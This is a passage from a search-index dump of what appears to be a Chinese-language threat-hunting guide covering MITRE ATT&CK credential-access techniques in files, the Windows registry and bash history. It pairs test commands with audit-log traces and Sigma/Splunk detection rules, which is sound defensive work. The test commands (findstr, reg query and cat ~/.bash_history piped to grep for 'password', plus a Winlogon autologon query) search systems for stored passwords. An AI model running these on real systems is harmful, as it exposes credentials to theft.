comm=\"grep\" exe=\"/bin/grep\" key=\"audit_110\" condition: keywords logsource: product: linux service: history detection: selection: keywords: \u200b - grep * passwd condition: keywords level: medium","title":"sigma\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-linux-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E6%8D%AE/#_7","text":"MITRE-ATT&CK-T1552-001 https://attack.mitre.org/techniques/T1552/001","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-win-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/","text":"T1552-001-win-\u6587\u4ef6\u4e2d\u7684\u51ed\u8bc1 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u4ee5\u5728\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u548c\u8fdc\u7a0b\u6587\u4ef6\u5171\u4eab\u4e2d\u641c\u7d22\u5305\u542b\u5bc6\u7801\u7684\u6587\u4ef6\u3002\u8fd9\u4e9b\u6587\u4ef6\u53ef\u4ee5\u662f\u7528\u6237\u521b\u5efa\u7684\u6587\u4ef6\uff0c\u7528\u4e8e\u5b58\u50a8\u81ea\u5df1\u7684\u51ed\u8bc1\uff0c\u4e00\u7ec4\u5171\u4eab\u7684\u51ed\u8bc1\uff0c\u5305\u542b\u7cfb\u7edf\u6216\u670d\u52a1\u5bc6\u7801\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u6216\u5305\u542b\u5d4c\u5165\u5bc6\u7801\u7684\u6e90\u4ee3\u7801/\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002 \u53ef\u4ee5\u901a\u8fc7\u7a83\u53d6\u51ed\u8bc1\u6280\u672f\u4ece\u5907\u4efd\u6216\u4fdd\u5b58\u7684\u865a\u62df\u673a\u4e2d\u63d0\u53d6\u5bc6\u7801\u3002\u4e5f\u53ef\u4ee5\u4ece\u5b58\u50a8\u5728Windows\u57df\u63a7\u5236\u5668\u4e0a\u7684\u7ec4\u7b56\u7565\u9996\u9009\u9879\u83b7\u53d6\u5bc6\u7801\u3002 \u6d4b\u8bd5\u6848\u4f8b findstr\u662fwindow\u7cfb\u7edf\u81ea\u5e26\u7684\u547d\u4ee4\uff0c\u7528\u9014\u662f\u67e5\u627e\u6307\u5b9a\u7684\u4e00\u4e2a\u6216\u591a\u4e2a\u6587\u4ef6\u6587\u4ef6\u4e2d\u5305\u542b\uff08\u6216\u901a\u8fc7\u53c2\u6570 /V\u6765\u63a7\u5236\u4e0d\u5305\u542b\uff09\u67d0\u4e9b\u7279\u5b9a\u5b57\u7b26\u4e32\u7684\u884c\uff0c\u5e76\u5c06\u8be5\u884c\u5b8c\u6574\u7684\u4fe1\u606f\u6253\u5370\u51fa\u6765\uff0c\u6216\u8005\u6253\u5370\u67e5\u8be2\u5b57\u7b26\u4e32\u6240\u5728\u7684\u6587\u4ef6\u540d\u3002\u5176\u7528\u9014\u548c\u7528\u6cd5\u90fd\u7c7b\u4f3clinux\u4e0b\u7684grep\u547d\u4ee4\u3002 findstr\u547d\u4ee4\u5177\u4f53\u7528\u6cd5\u53ef\u53c2\u8003\u5fae\u8f6f\u76f8\u5173\u8bf4\u660e\uff1a https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 C:\\Users\\Administrator>findstr /ni /c:\"password\" test.txt 19:password \u6d4b\u8bd5\u7559\u75d5 windows\u5b89\u5168\u65e5\u5fd7 \u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u521b\u5efa\u8005\u4e3b\u9898: \u5b89\u5168 ID: QAX\\Administrator \u5e10\u6237\u540d: Administrator \u5e10\u6237\u57df: QAX \u767b\u5f55 ID: 0x7169C \u76ee\u6807\u4e3b\u9898: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xc14 \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\findstr.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1936 \u5f3a\u5236\u6027\u6807\u7b7e: Mandatory Label\\High Mandatory Level \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x304 \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe \u8fdb\u7a0b\u547d\u4ee4\u884c: findstr /ni /c:\"password\" test.txt \u68c0\u6d4b\u89c4\u5219/\u601d\u8def Sigma\u89c4\u5219 title: widnows\u4e0b\u5229\u7528findstr\u547d\u4ee4\u67e5\u627e\u7528\u6237\u51ed\u8bc1 status: \u6d4b\u8bd5\u9636\u6bb5 description: \u5229\u7528findstr\u547d\u4ee4\u67e5\u627e\u6307\u5b9a\u6587\u4ef6\u5185\u5305\u542bpassword\u5173\u952e\u8bcd\u4fe1\u606f tags: - attack.t1552-001 logsource: category: process_creation product: windows detection: selection: Eventid: - 4688 #\u8fdb\u7a0b\u521b\u5efa\uff0cwindows \u5b89\u5168\u65e5\u5fd7\uff0cWindows server 2012\u53ca\u4ee5\u4e0a\u7248\u672c\u914d\u7f6e\u76f8\u5173\u5ba1\u6838\u7b56\u7565\uff0c\u53ef\u8bb0\u5f55\u7cfb\u7edf\u547d\u4ee4\u884c\u53c2\u6570 CommandLine|contains|all: - 'findstr' - 'password' condition: selection level: medium \u5efa\u8bae \u867d\u7136\u5728\u4e0d\u77e5\u9053\u5b83\u4eec\u6700\u521d\u5b58\u5728\u7684\u60c5\u51b5\u4e0b\uff0c\u68c0\u6d4b\u653b\u51fb\u8005\u8bbf\u95ee\u8fd9\u4e9b\u6587\u4ef6\u53ef\u80fd\u5f88\u56f0\u96be\uff0c\u4f46\u53ef\u4ee5\u68c0\u6d4b\u5230\u653b\u51fb\u8005\u5bf9\u5b83\u4eec\u5df2\u83b7\u53d6\u7684\u51ed\u636e\u7684\u4f7f\u7528\u3002\u76d1\u89c6\u6b63\u5728\u6267\u884c\u7684\u8fdb\u7a0b\u7684\u547d\u4ee4\u884c\u53c2\u6570\u4e2d\u662f\u5426\u6709\u53ef\u7591\u5b57\u8bcd\u6216\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u5b83\u4eec\u8868\u793a\u653b\u51fb\u8005\u53ef\u80fd\u6b63\u5728\u641c\u7d22\u5bc6\u7801\uff08\u4f8b\u5982\uff1apassword\uff0cpwd\uff0clogin\uff0csecure\uff09\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1552-001 https://attack.mitre.org/techniques/T1552/001","title":"T1552-001-win-\u6587\u4ef6\u4e2d\u7684\u51ed\u8bc1"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-win-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#t1552-001-win-","text":"","title":"T1552-001-win-\u6587\u4ef6\u4e2d\u7684\u51ed\u8bc1"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-win-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#attck","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u672c\u5730\u6587\u4ef6\u7cfb\u7edf\u548c\u8fdc\u7a0b\u6587\u4ef6\u5171\u4eab\u4e2d\u641c\u7d22\u5305\u542b\u5bc6\u7801\u7684\u6587\u4ef6\u3002\u8fd9\u4e9b\u6587\u4ef6\u53ef\u4ee5\u662f\u7528\u6237\u521b\u5efa\u7684\u6587\u4ef6\uff0c\u7528\u4e8e\u5b58\u50a8\u81ea\u5df1\u7684\u51ed\u8bc1\uff0c\u4e00\u7ec4\u5171\u4eab\u7684\u51ed\u8bc1\uff0c\u5305\u542b\u7cfb\u7edf\u6216\u670d\u52a1\u5bc6\u7801\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u6216\u5305\u542b\u5d4c\u5165\u5bc6\u7801\u7684\u6e90\u4ee3\u7801/\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002 \u53ef\u4ee5\u901a\u8fc7\u7a83\u53d6\u51ed\u8bc1\u6280\u672f\u4ece\u5907\u4efd\u6216\u4fdd\u5b58\u7684\u865a\u62df\u673a\u4e2d\u63d0\u53d6\u5bc6\u7801\u3002\u4e5f\u53ef\u4ee5\u4ece\u5b58\u50a8\u5728Windows\u57df\u63a7\u5236\u5668\u4e0a\u7684\u7ec4\u7b56\u7565\u9996\u9009\u9879\u83b7\u53d6\u5bc6\u7801\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-win-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_1","text":"findstr\u662fwindow\u7cfb\u7edf\u81ea\u5e26\u7684\u547d\u4ee4\uff0c\u7528\u9014\u662f\u67e5\u627e\u6307\u5b9a\u7684\u4e00\u4e2a\u6216\u591a\u4e2a\u6587\u4ef6\u6587\u4ef6\u4e2d\u5305\u542b\uff08\u6216\u901a\u8fc7\u53c2\u6570 /V\u6765\u63a7\u5236\u4e0d\u5305\u542b\uff09\u67d0\u4e9b\u7279\u5b9a\u5b57\u7b26\u4e32\u7684\u884c\uff0c\u5e76\u5c06\u8be5\u884c\u5b8c\u6574\u7684\u4fe1\u606f\u6253\u5370\u51fa\u6765\uff0c\u6216\u8005\u6253\u5370\u67e5\u8be2\u5b57\u7b26\u4e32\u6240\u5728\u7684\u6587\u4ef6\u540d\u3002\u5176\u7528\u9014\u548c\u7528\u6cd5\u90fd\u7c7b\u4f3clinux\u4e0b\u7684grep\u547d\u4ee4\u3002 findstr\u547d\u4ee4\u5177\u4f53\u7528\u6cd5\u53ef\u53c2\u8003\u5fae\u8f6f\u76f8\u5173\u8bf4\u660e\uff1a https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-win-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-win-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_3","text":"C:\\Users\\Administrator>findstr /ni /c:\"password\" test.txt 19:password","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-win-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_4","text":"windows\u5b89\u5168\u65e5\u5fd7 \u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002 \u521b\u5efa\u8005\u4e3b\u9898: \u5b89\u5168 ID: QAX\\Administrator \u5e10\u6237\u540d: Administrator \u5e10\u6237\u57df: QAX \u767b\u5f55 ID: 0x7169C \u76ee\u6807\u4e3b\u9898: \u5b89\u5168 ID: NULL SID \u5e10\u6237\u540d: - \u5e10\u6237\u57df: - \u767b\u5f55 ID: 0x0 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0xc14 \u65b0\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\findstr.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: %%1936 \u5f3a\u5236\u6027\u6807\u7b7e: Mandatory Label\\High Mandatory Level \u521b\u5efa\u8005\u8fdb\u7a0b ID: 0x304 \u521b\u5efa\u8005\u8fdb\u7a0b\u540d\u79f0: C:\\Windows\\System32\\cmd.exe \u8fdb\u7a0b\u547d\u4ee4\u884c: findstr /ni /c:\"password\" test.txt","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-win-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-win-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#sigma","text":"title: widnows\u4e0b\u5229\u7528findstr\u547d\u4ee4\u67e5\u627e\u7528\u6237\u51ed\u8bc1 status: \u6d4b\u8bd5\u9636\u6bb5 description: \u5229\u7528findstr\u547d\u4ee4\u67e5\u627e\u6307\u5b9a\u6587\u4ef6\u5185\u5305\u542bpassword\u5173\u952e\u8bcd\u4fe1\u606f tags: - attack.t1552-001 logsource: category: process_creation product: windows detection: selection: Eventid: - 4688 #\u8fdb\u7a0b\u521b\u5efa\uff0cwindows \u5b89\u5168\u65e5\u5fd7\uff0cWindows server 2012\u53ca\u4ee5\u4e0a\u7248\u672c\u914d\u7f6e\u76f8\u5173\u5ba1\u6838\u7b56\u7565\uff0c\u53ef\u8bb0\u5f55\u7cfb\u7edf\u547d\u4ee4\u884c\u53c2\u6570 CommandLine|contains|all: - 'findstr' - 'password' condition: selection level: medium","title":"Sigma\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-win-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_6","text":"\u867d\u7136\u5728\u4e0d\u77e5\u9053\u5b83\u4eec\u6700\u521d\u5b58\u5728\u7684\u60c5\u51b5\u4e0b\uff0c\u68c0\u6d4b\u653b\u51fb\u8005\u8bbf\u95ee\u8fd9\u4e9b\u6587\u4ef6\u53ef\u80fd\u5f88\u56f0\u96be\uff0c\u4f46\u53ef\u4ee5\u68c0\u6d4b\u5230\u653b\u51fb\u8005\u5bf9\u5b83\u4eec\u5df2\u83b7\u53d6\u7684\u51ed\u636e\u7684\u4f7f\u7528\u3002\u76d1\u89c6\u6b63\u5728\u6267\u884c\u7684\u8fdb\u7a0b\u7684\u547d\u4ee4\u884c\u53c2\u6570\u4e2d\u662f\u5426\u6709\u53ef\u7591\u5b57\u8bcd\u6216\u6b63\u5219\u8868\u8fbe\u5f0f\uff0c\u5b83\u4eec\u8868\u793a\u653b\u51fb\u8005\u53ef\u80fd\u6b63\u5728\u641c\u7d22\u5bc6\u7801\uff08\u4f8b\u5982\uff1apassword\uff0cpwd\uff0clogin\uff0csecure\uff09\u3002","title":"\u5efa\u8bae"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-001-win-%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_7","text":"MITRE-ATT&CK-T1552-001 https://attack.mitre.org/techniques/T1552/001","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-002-win-%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/","text":"T1552-002-win-\u6ce8\u518c\u8868\u4e2d\u7684\u51ed\u8bc1 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 Windows\u6ce8\u518c\u8868\u5b58\u50a8\u7cfb\u7edf\u6216\u5176\u4ed6\u7a0b\u5e8f\u53ef\u4ee5\u4f7f\u7528\u7684\u914d\u7f6e\u4fe1\u606f\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u67e5\u8be2\u6ce8\u518c\u8868\uff0c\u4ee5\u67e5\u627e\u5df2\u5b58\u50a8\u4f9b\u5176\u4ed6\u7a0b\u5e8f\u6216\u670d\u52a1\u4f7f\u7528\u7684\u51ed\u636e\u548c\u5bc6\u7801\u3002\u6709\u65f6\uff0c\u8fd9\u4e9b\u51ed\u636e\u7528\u4e8e\u81ea\u52a8\u767b\u5f55\u3002 \u6d4b\u8bd5\u6848\u4f8b \u67e5\u627e\u4e0e\u5bc6\u7801\u4fe1\u606f\u76f8\u5173\u7684\u6ce8\u518c\u8868\u9879\u7684\u793a\u4f8b\u547d\u4ee4\uff1a \u672c\u5730\u673a\u5668\u914d\u7f6e\u5355\u5143\uff1a reg query HKLM /f password /t REG_SZ /s \u5f53\u524d\u7528\u6237\u914d\u7f6e\u5355\u5143\uff1a reg query HKCU /f password /t REG_SZ /s \u68c0\u6d4b\u65e5\u5fd7 Windows Sysmon\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 Windows \u81ea\u52a8\u767b\u9646\uff1a reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" SNMP \u76f8\u5173\u53c2\u6570\uff1a reg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\" \u6d4b\u8bd5\u7559\u75d5 Windows Sysmon\u65e5\u5fd7 \u4e8b\u4ef61\uff0c\u547d\u4ee4\u884c\u53c2\u6570\u7b49 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: \u6ce8\u518c\u8868\u4e2d\u7684\u51ed\u8bc1\u679a\u4e3e description: win7\u6d4b\u8bd5 references: http://www.rinige.com/index.php/archives/770/ tags: T1552-002 status: experimental author: 12306Bro logsource: product: windows service: sysmon detection: selection: EventID: 1 #\u8fdb\u7a0b\u521b\u5efa Image: 'C:\\*\\reg.exe' OriginalFileName: reg.exe CommandLine: 'reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\"' ParentCommandLine: \"C:\\*\\cmd.exe\" condition: selection level: medium \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1552-002 https://attack.mitre.org/techniques/T1552/002/ T1214\u6a21\u62df\u6d4b\u8bd5 https://ired.team/offensive-security/credential-access-and-credential-dumping/t1214-credentials-in-registry \u6e17\u900f\u6d4b\u8bd5\u4e2d\u9700\u8981\u5173\u6ce8\u7684\u672c\u5730\u51ed\u636e http://www.rinige.com/index.php/archives/770/","title":"T1552-002-win-\u6ce8\u518c\u8868\u4e2d\u7684\u51ed\u8bc1"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-002-win-%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#t1552-002-win-","text":"","title":"T1552-002-win-\u6ce8\u518c\u8868\u4e2d\u7684\u51ed\u8bc1"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-002-win-%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#attck","text":"Windows\u6ce8\u518c\u8868\u5b58\u50a8\u7cfb\u7edf\u6216\u5176\u4ed6\u7a0b\u5e8f\u53ef\u4ee5\u4f7f\u7528\u7684\u914d\u7f6e\u4fe1\u606f\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u67e5\u8be2\u6ce8\u518c\u8868\uff0c\u4ee5\u67e5\u627e\u5df2\u5b58\u50a8\u4f9b\u5176\u4ed6\u7a0b\u5e8f\u6216\u670d\u52a1\u4f7f\u7528\u7684\u51ed\u636e\u548c\u5bc6\u7801\u3002\u6709\u65f6\uff0c\u8fd9\u4e9b\u51ed\u636e\u7528\u4e8e\u81ea\u52a8\u767b\u5f55\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-002-win-%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_1","text":"\u67e5\u627e\u4e0e\u5bc6\u7801\u4fe1\u606f\u76f8\u5173\u7684\u6ce8\u518c\u8868\u9879\u7684\u793a\u4f8b\u547d\u4ee4\uff1a \u672c\u5730\u673a\u5668\u914d\u7f6e\u5355\u5143\uff1a reg query HKLM /f password /t REG_SZ /s \u5f53\u524d\u7528\u6237\u914d\u7f6e\u5355\u5143\uff1a reg query HKCU /f password /t REG_SZ /s","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-002-win-%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_2","text":"Windows Sysmon\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-002-win-%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_3","text":"Windows \u81ea\u52a8\u767b\u9646\uff1a reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\" SNMP \u76f8\u5173\u53c2\u6570\uff1a reg query \"HKLM\\SYSTEM\\Current\\ControlSet\\Services\\SNMP\"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-002-win-%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_4","text":"Windows Sysmon\u65e5\u5fd7 \u4e8b\u4ef61\uff0c\u547d\u4ee4\u884c\u53c2\u6570\u7b49","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-002-win-%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-002-win-%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#sigma","text":"title: \u6ce8\u518c\u8868\u4e2d\u7684\u51ed\u8bc1\u679a\u4e3e description: win7\u6d4b\u8bd5 references: http://www.rinige.com/index.php/archives/770/ tags: T1552-002 status: experimental author: 12306Bro logsource: product: windows service: sysmon detection: selection: EventID: 1 #\u8fdb\u7a0b\u521b\u5efa Image: 'C:\\*\\reg.exe' OriginalFileName: reg.exe CommandLine: 'reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon\"' ParentCommandLine: \"C:\\*\\cmd.exe\" condition: selection level: medium","title":"sigma\u89c4\u5219"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-002-win-%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-002-win-%E6%B3%A8%E5%86%8C%E8%A1%A8%E4%B8%AD%E7%9A%84%E5%87%AD%E8%AF%81/#_7","text":"MITRE-ATT&CK-T1552-002 https://attack.mitre.org/techniques/T1552/002/ T1214\u6a21\u62df\u6d4b\u8bd5 https://ired.team/offensive-security/credential-access-and-credential-dumping/t1214-credentials-in-registry \u6e17\u900f\u6d4b\u8bd5\u4e2d\u9700\u8981\u5173\u6ce8\u7684\u672c\u5730\u51ed\u636e http://www.rinige.com/index.php/archives/770/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-003-linux-Bash%E5%8E%86%E5%8F%B2/","text":"T1552-003-linux-Bash\u5386\u53f2\u8bb0\u5f55 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 Bash\u4f7f\u7528\u201chistory\u201d\u5b9e\u7528\u7a0b\u5e8f\u8ddf\u8e2a\u7528\u6237\u5728\u547d\u4ee4\u884c\u4e0a\u952e\u5165\u7684\u547d\u4ee4\u3002\u7528\u6237\u6ce8\u9500\u540e\uff0c\u4f1a\u5c06\u5386\u53f2\u8bb0\u5f55\u5237\u65b0\u5230\u7528\u6237\u7684 .bash_history \u6587\u4ef6\u4e2d\u3002\u5bf9\u4e8e\u6bcf\u4e2a\u7528\u6237\uff0c\u6b64\u6587\u4ef6\u4f4d\u4e8e\u540c\u4e00\u4f4d\u7f6e\uff1a ~/.bash_history \u3002\u901a\u5e38\uff0c\u6b64\u6587\u4ef6\u4f1a\u8ddf\u8e2a\u7528\u6237\u7684\u6700\u8fd1500\u4e2a\u547d\u4ee4\u3002\u7528\u6237\u901a\u5e38\u5728\u547d\u4ee4\u884c\u4e0a\u952e\u5165\u7528\u6237\u540d\u548c\u5bc6\u7801\u4f5c\u4e3a\u7a0b\u5e8f\u7684\u53c2\u6570\uff0c\u7136\u540e\u5728\u6ce8\u9500\u65f6\u5c06\u5176\u4fdd\u5b58\u5230\u6b64\u6587\u4ef6\u4e2d\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u6ee5\u7528\u6b64\u529f\u80fd\u6765\u67e5\u770b\u6587\u4ef6\u6765\u67e5\u770b\u6f5c\u5728\u51ed\u636e\u3002 \u6d4b\u8bd5\u6848\u4f8b cat #{bash\u5386\u53f2\u547d\u4ee4\u540d\u5b57} | grep #{bash\u5386\u53f2\u547d\u4ee4\u5173\u952e\u8bcd\u68c0\u7d22} > #{\u8f93\u51fa\u6587\u4ef6\u540d} sudo cat ~/.bash_history | grep password > bash.txt \u68c0\u6d4b\u65e5\u5fd7 linux audit\u65e5\u5fd7 \uff08\u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1aUbuntu\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6ca1\u6709audit\uff0c\u9700\u8981\u4e0b\u8f7d\u5b89\u88c5\u5e76\u914d\u7f6e\u76f8\u5173\u7b56\u7565\uff09 bash\u5386\u53f2\u8bb0\u5f55 \u6d4b\u8bd5\u590d\u73b0 icbc@icbc:/$ sudo cat ~/.bash_history | grep password > bash.txt \u6d4b\u8bd5\u7559\u75d5 audit\u65e5\u5fd7 icbc@icbc:/$ sudo cat ~/.bash_history | grep password > bash.txt type=PATH msg=audit(1563528127.048:1097): item=0 name=\"/usr/bin/cat\" inode=2228383 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 type=PATH msg=audit(1563528127.048:1097): item=1 name=\"/lib64/ld-linux-x86-64.so.2\" inode=2237074 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0 cap_fi=0 cap_fe=0 cap_fver=0 type=PROCTITLE msg=audit(1563528127.048:1097): proctitle=636174002F726F6F742F2E626173685F686973746F7279 type=SYSCALL msg=audit(1563528127.056:1099): arch=c000003e syscall=257 success=yes exit=3 a0=ffffff9c a1=7ffd4ebbb73b a2=0 a3=0 items=1 ppid=5249 pid=5258 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=3 comm=\"cat\" exe=\"/usr/bin/cat\" key=\"bash_history_110\" type=CWD msg=audit(1563528127.056:1099): cwd=\"/root\" \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u8fd9\u91cc\u53ea\u63d0\u53d6\u51fa\u4e86\u5f02\u5e38\u65e5\u5fd7\uff0c\u6545\u7701\u7565\u4e86\u5f88\u591a\u65e5\u5fd7\u7ec6\u8282\u3002 bash\u5386\u53f2\u8bb0\u5f55 icbc@icbc:/$ history 1 sudo cat ~/.bash_history | grep password > bash.txt \u68c0\u6d4b\u89c4\u5219/\u601d\u8def splunk\u89c4\u5219 audit \u65e5\u5fd7 index=linux sourcetype=\"linux_audit\" syscall=257 key=bash_history_110 | table host,auid,syscall,syscall_name,exe \u503c\u5f97\u6ce8\u610f\u7684\u662f\uff1a\u4f60\u9700\u8981\u81ea\u884c\u914d\u7f6eAudit\u5ba1\u6838\u89c4\u5219 sudo auditctl -w ~/.bash_history -k bash_history_110 splunk\u89c4\u5219 bash \u5386\u53f2\u8bb0\u5f55 index=linux sourcetype=bash_history cat bash_history | table _time,host,user_name,bash_command sigma\u89c4\u5219 title: \u653b\u51fb\u8005\u8bfb\u53d6linux\u4e0b~/.bash_history\u6587\u4ef6\uff0c\u67e5\u770b\u662f\u5426\u5305\u542b\u76f8\u5173\u51ed\u636e\u5bc6\u7801 description: Ubuntu18.04 references: https://github.com/12306Bro/Threat-hunting/blob/master/T1139-linux-Bash\u5386\u53f2\u8bb0\u5f55.md tags: T1552-003 status: experimental author: 12306Bro logsource: \u200b product: linux \u200b service: audit detection: \u200b keywords: \u200b - 